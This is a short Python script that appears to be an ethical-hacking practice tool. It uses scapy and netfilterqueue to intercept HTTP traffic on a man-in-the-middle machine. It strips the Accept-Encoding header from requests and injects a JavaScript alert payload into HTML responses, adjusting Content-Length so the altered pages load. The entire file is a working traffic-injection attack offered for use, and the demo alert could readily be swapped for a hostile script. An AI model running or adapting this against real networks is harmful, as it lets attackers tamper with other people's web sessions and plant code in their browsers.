#!/usr/bin/env python3
import scapy.all as scapy
import netfilterqueue
import re


def set_load(packet, load):
    """
    Modify the packet payload and recalculate checksums.
    """
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    """
    Intercept and modify packets in the queue.
    """
    scapy_packet = scapy.IP(packet.get_payload())

    # Check if the packet has a TCP layer and a Raw payload
    if scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode(errors="ignore")  # Decode payload to string

            # Modify HTTP Request
            if scapy_packet[scapy.TCP].dport == 80:  # HTTP Request
                print('[+] HTTP Request Intercepted')
                load = re.sub(r"Accept-Encoding:.*?\r\n", "", load)
                load = load.replace("HTTP/1/1", "HTTP/1.0")

            # Modify HTTP Response
            elif scapy_packet[scapy.TCP].sport == 80:  # HTTP Response
                print('[+] HTTP Response Intercepted')
                injection_code = "<script>alert('YOU HAVE BEEN HACKED');</script>"
                if "</body>" in load and "text/html" in load:
                    # Inject the script before </body>
                    load = load.replace("</body>", injection_code + "</body>")
                    # Adjust Content-Length header if it exists
                    content_length_search = re.search(r"(?:Content-Length:\s)(\d+)", load)
                    if content_length_search:
                        content_length = content_length_search.group(1)
                        new_content_length = int(content_length) + len(injection_code)
                        load = load.replace(f"Content-Length: {content_length}",
                                            f"Content-Length: {new_content_length}")

            # If the payload is modified, update the packet
            if load.encode() != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load.encode())
                packet.set_payload(bytes(new_packet))

        except Exception as e:
            print(f"[!] Error processing packet: {e}")

    # Forward the packet to its destination
    packet.accept()


# Bind the NetfilterQueue to process packets
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
